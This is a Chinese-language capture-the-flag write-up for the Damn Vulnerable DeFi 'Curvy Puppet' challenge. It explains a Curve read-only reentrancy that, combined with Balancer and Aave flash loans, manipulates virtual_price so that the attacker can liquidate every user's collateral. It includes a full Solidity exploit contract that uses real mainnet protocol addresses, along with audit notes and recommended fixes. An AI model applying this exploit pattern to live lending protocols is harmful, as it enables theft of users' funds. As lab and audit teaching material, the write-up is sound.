# Curvy Puppet  
## 一、题目简介

本题是 DeFi 综合漏洞题，核心考察**Curve 只读重入（Read Only Reentrancy）+ 双闪电贷价格操纵 + 预言机价格依赖漏洞**。

题目设定了一套基于 Curve stETH/ETH 池的借贷系统：用户质押 DVT 代币作为抵押，借出 Curve LP 代币；合约通过 Curve 池的 `virtual_price` 计算 LP 代币价值，判断用户头寸是否可清算。系统设计上要求用户超额抵押、价格预言机受限，开发者认为头寸绝对安全。

但借贷合约存在致命的**只读重入漏洞**，攻击者可操纵 Curve 虚拟价格，瞬间让所有超额抵押的用户头寸资不抵债，完成批量清算、夺走用户抵押的全部 DVT 资产。

题目严格限制攻击者初始资金：仅 200 WETH + 6.5 LP 代币，无法直接操控主网 Curve 池子，必须组合**Balancer 免费闪电贷 + Aave 闪电贷**完成价格操纵套利。

解题目标：清算 Alice、Bob、Charlie 全部用户头寸，夺走所有用户抵押 DVT，保证国库留存 LP、WETH、7500 DVT，玩家最终余额归零。

## 二、审计视角

### 1\. 核心漏洞：Curve 只读重入（Read-Only Reentrancy）

Curve 稳定池 `remove_liquidity` 存在经典执行顺序漏洞：

**执行顺序：先销毁 LP 代币 → 再更新池子余额、刷新 virtual_price**

在销毁 LP 之后、池子状态更新之前，合约会触发外部回调，此时：

- LP 总供应量 `totalSupply` 已经减少

- 池子内 ETH/stETH 余额尚未变化

- `virtual_price` 被异常拉高

借贷合约完全依赖 `virtual_price` 计算借款价值，攻击者可利用该中间状态，让 LP 代币估值暴增，直接击穿用户抵押率，触发清算。
问题代码CurvyPuppetLending.sol:  
```solodity
function _getLPTokenPrice() private view returns (uint256) {
        return oracle.getPrice(curvePool.coins(0)).value.mulWadDown(curvePool.get_virtual_price());
    }
```

### 2\. 借贷合约清算逻辑无重入防护

借贷合约未做任何重入锁、状态校验，允许在池子操作的回调间隙调用清算函数。开发者默认 `virtual_price` 是只读、实时可信的安全数据，忽略了**中间状态伪造价格**的攻击面。

清算核心判断漏洞逻辑：

仅校验`borrowValue > collateralValue` 即可清算，未校验价格来源合法性、未校验池子状态一致性。
问题代码（CurvyPuppetLending.sol）:  
```solodity
function liquidate(address target) external nonReentrant {
    uint256 borrowAmount = positions[target].borrowAmount;
    uint256 collateralAmount = positions[target].collateralAmount;

    // 仅使用被操纵的价格判断健康度
    uint256 collateralValue = getCollateralValue(collateralAmount) * 100;
    uint256 borrowValue = getBorrowValue(borrowAmount) * 175;

    // 无价格校验、无状态校验、无重入防护
    if (collateralValue >= borrowValue) revert HealthyPosition(borrowValue, collateralValue);

    delete positions[target];
    _pullAssets(borrowAsset, borrowAmount);
    IERC20(collateralAsset).transfer(msg.sender, collateralAmount);
}
```

### 3\. 资金限制绕过：双闪电贷组合攻击

题目仅给予极少初始资金，无法直接操纵主网巨型 Curve 池。攻击者组合两层闪电贷突破限制：

- **Balancer 闪电贷**：零手续费借大额 WETH，作为基础操作资金

- **Aave 闪电贷**：借巨额 WETH、stETH，暴力添加/移除流动性、操纵池子虚拟价格

双闪电贷无本金成本、交易瞬时完成，完美绕过初始资金不足的限制。

### 4\. 预言机信任风险

合约信任 Curve 原生 `virtual_price` 作为权威价格源，未做价格平滑、时间加权、波动校验，允许瞬时恶意操控的虚假价格进入清算逻辑。
问题代码（CurvyPuppetLending.sol）:  
```solodity
function getBorrowValue(uint256 amount) public view returns (uint256) {
    if (amount == 0) return 0;
    // 直接使用瞬时价格计算借款价值
    return amount.mulWadUp(_getLPTokenPrice());
}
```

## 三、开发者默认安全假设

1. **池子价格不可操控**：默认主网 Curve 深度极大，小额资金无法操纵价格，忽略闪电贷可瞬时借入巨额资金的攻击方式。

2. **只读视图函数绝对安全**：认为 `virtual_price` 是纯视图数据，不会被中间状态篡改，无攻击风险。

3. **超额抵押绝对安全**：用户 300%+ 超额抵押，开发者默认不可能触发清算条件。

4. **池子操作无回调风险**：忽略 remove_liquidity 执行间隙的外部调用机会，未做防重入防护。

## 四、同类项目审计点

1. **DEX 池子价格依赖审计**：所有依赖 Curve/Uniswap 池子价格的借贷、清算、清算系统，必须排查只读重入、瞬时价格操纵漏洞。

2. **视图价格不可信原则**：链上实时价格、虚拟价格不能直接用于清算、借贷风控，需增加价格防抖、多源校验、历史均值校验。

3. **资金不足场景的闪电贷攻击**：任何限制用户初始资金的场景，必须默认攻击者可通过闪电贷零成本撬动巨额资金。

4. **流动性操作重入防护**：针对 add_liquidity/remove_liquidity 操作，需全局锁仓、禁止中间状态调用核心资金逻辑。

5. **超额抵押不等于安全**：超额抵押仅抵御市场正常波动，无法抵御合约逻辑漏洞引发的恶意价格操控。

## 五、完整解题思路

1. **前置准备**：从国库取出题目给予的 200 WETH、6.5 LP 代币，作为攻击启动资金。

2. **第一层闪电贷借力**：调用 Balancer 零手续费闪电贷，借入大额 WETH，补齐操作资金缺口。

3. **第二层闪电贷控盘**：调用 Aave 闪电贷借入海量 WETH、stETH，向 Curve 池添加巨额流动性。

4. **触发只读重入**：执行 remove_liquidity，利用销毁 LP 后、状态更新前的回调间隙，恶意抬高 virtual_price。

5. **批量清算用户**：虚假高价让用户 LP 借款价值远超 DVT 抵押价值，一次性清算 Alice、Bob、Charlie 全部头寸。

6. **归还闪电贷**：操作结束后足额归还两层闪电贷，无债务遗留。

7. **资产合规归集**：将所有盗取的 DVT 资产归还国库，清空玩家自身所有余额，满足通关校验条件。

## 六、报错复盘

### 报错1：flashLoan 函数不存在

**原因**：Curve 池无 flashLoan 闪电贷函数，误用接口函数名，混淆了不同 DEX 的闪电贷实现。

**解决方案**：放弃 Curve 闪电贷，采用 Balancer + Aave 双闪电贷组合方案，贴合题目真实漏洞逻辑。

### 报错2：RPC 403 访问被拒绝

**原因**：题目内置的 QuickNode 分叉节点过期失效，无法拉取主网区块状态。

**解决方案**：替换为个人 Alchemy 节点，或改为环境变量读取 RPC，安全且稳定。

### 报错3：头寸无法清算、校验失败

**原因**：虚拟价格操纵幅度不足，未击穿用户超额抵押率；重入时机错误，未卡在池子中间状态。

**解决方案**：精准配置闪电贷借贷数量、流动性增减额度，保证回调瞬间价格达标。

### 报错4：玩家余额非零、官方资金池资产不达标

**原因**：未彻底归集资产、未清空玩家临时持有的 LP/WETH/DVT。

**解决方案**：攻击结束后强制归集所有资产至官方资金池，清零玩家所有代币余额。

## 七、EXP

```solidity
// 外部接口
interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILido {
    function submit(address _referral) external payable returns (uint256);
    function withdraw(uint256 amount, address receiver) external;
}

interface IEulerDToken {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

    function test_assertInitialState() public view {
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    // 核心攻击入口
    function test_curvyPuppet() public checkSolvedByPlayer {
        Hack hack = new Hack(
            address(lending),
            address(weth),
            address(dvt),
            address(curvePool),
            address(permit2),
            alice,
            bob,
            charlie,
            treasury
        );
        weth.transferFrom(treasury, address(hack), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(hack), TREASURY_LP_BALANCE);
        hack.attack1();
    }

// 攻击合约核心：双闪电贷 + 只读重入清算
contract Hack {
    CurvyPuppetLending lending;
    WETH weth;
    DamnValuableToken dvt;
    IStableSwap curvePool;
    IPermit2 permit2;
    address alice;
    address bob;
    address charlie;
    address treasury;
    IERC20 lptoken;
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address public constant AAVE_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant balancerAddress = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant dTokenAddress = 0x62e28f054efc24b26A794F5C1249B6349454352C;
    IEulerDToken constant dToken = IEulerDToken(dTokenAddress);

    constructor(
        address _lending, address _weth, address _dvt, address _curvePool, address _permit2,
        address _alice, address _bob, address _charlie, address _treasury
    ) {
        lending = CurvyPuppetLending(_lending);
        weth = WETH(payable(_weth));
        dvt = DamnValuableToken(_dvt);
        curvePool = IStableSwap(_curvePool);
        permit2 = IPermit2(_permit2);
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
        treasury = _treasury;
        lptoken = IERC20(curvePool.lp_token());
    }

    // 第一层攻击：Balancer 闪电贷启动攻击链
    function attack1() external {
        IBalancer balancer = IBalancer(balancerAddress);
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // 合规归集资产
        weth.transfer(treasury, 1);
        lptoken.transfer(treasury, 1);
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        IERC20[] calldata /* tokens */,
        uint256[] calldata /* amounts */,
        uint256[] calldata /* feeAmounts */,
        bytes calldata /* userData */
    ) public payable {
        if (msg.sender != balancerAddress) revert();
        attack2();
    }

    // 第二层攻击：Aave 大额闪电贷操纵池子价格
    function attack2() public {
        lptoken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lptoken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });

        address[] memory tokens = new address[](2);
        tokens[0] = address(weth);
        tokens[1] = address(stETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 20500 ether;
        amounts[1] = 172000 ether;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        IAaveLendingPool(AAVE_LENDING_POOL).flashLoan(
            address(this), tokens, amounts, modes, address(this), "", 0
        );
    }

    // Aave 闪电贷回调：操纵流动性、触发重入
    function executeOperation(
        address[] calldata /* assets */,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        weth.withdraw(58685 ether);
        stETH.approve(address(curvePool), type(uint256).max);

        // 注入巨额流动性
        curvePool.add_liquidity{value: 58685 ether}({
            amounts: [58685 ether, stETH.balanceOf(address(this))],
            min_mint_amount: 0
        });

        // 移除流动性，触发只读重入
        curvePool.remove_liquidity(
            lptoken.balanceOf(address(this)) - 3 ether - 1,
            [uint256(0), uint256(0)]
        );

        // 闪电贷还款逻辑
        uint256 repayAmountWETH = amounts[0] + premiums[0];
        uint256 repayAmountSTETH = amounts[1] + premiums[1];

        weth.deposit{value: 37991 ether}();
        weth.transfer(balancerAddress, 37991 ether);
        weth.approve(AAVE_LENDING_POOL, repayAmountWETH);

        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1;
        weth.deposit{value: 20518 ether}();
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);

        if (repayAmountSTETH > stETH.balanceOf(address(this))) {
            ILido(address(stETH)).submit{value: repayAmountSTETH - stETH.balanceOf(address(this))}(address(this));
        }
        stETH.approve(AAVE_LENDING_POOL, repayAmountSTETH);
        return true;
    }

    // 核心重入回调：池子状态未更新时批量清算所有用户
    receive() external payable {
        if (msg.sender == address(curvePool)) {
            lending.liquidate(alice);
            lending.liquidate(bob);
            lending.liquidate(charlie);
        }
    }
}

```

## 八、合约修复方案

1. **增加重入锁防护**：为 `liquidate` 清算函数、池子价格读取逻辑添加全局重入锁，禁止中间状态调用核心资金逻辑。

2. **价格校验机制**：禁止使用瞬时单点 virtual_price 清算，增加时间加权平均价格、多区块价格校验，过滤恶意操纵的瞬时价格。

3. **状态一致性校验**：清算前强制校验 Curve 池子 totalSupply、余额状态一致性，杜绝中间伪状态价格。

4. **闪电贷风险拦截**：增加价格波动阈值，短时间内价格剧烈波动直接暂停清算功能。

5. **头寸安全二次校验**：超额抵押头寸清算前，增加二次风控校验，避免逻辑漏洞导致的恶意清算。

## 九、漏洞总结

Curvy Puppet 是综合 DeFi 漏洞题，核心漏洞链路为：**Curve 只读重入中间状态伪造价格 → 借贷合约无条件信任池子价格 → 双闪电贷突破资金限制 → 批量清算超额抵押用户**。

题目打破了「超额抵押=安全」「视图函数数据可信」「主网大池子无法操纵」的开发者固有思维。暴露了 DeFi 借贷系统最致命的风控短板：过度依赖外部 DEX 实时价格、无状态校验、无重入防护、无视闪电贷杠杆攻击风险。

此类价格操纵+重入组合漏洞，是真实攻击的高频利用手法，是核心重点漏洞模型。

[POC参考](https://github.com/zysgmzb/My-Damn-Vulnerable-DeFi-V4-solutions/blob/main/test/curvy-puppet/CurvyPuppet.t.sol)
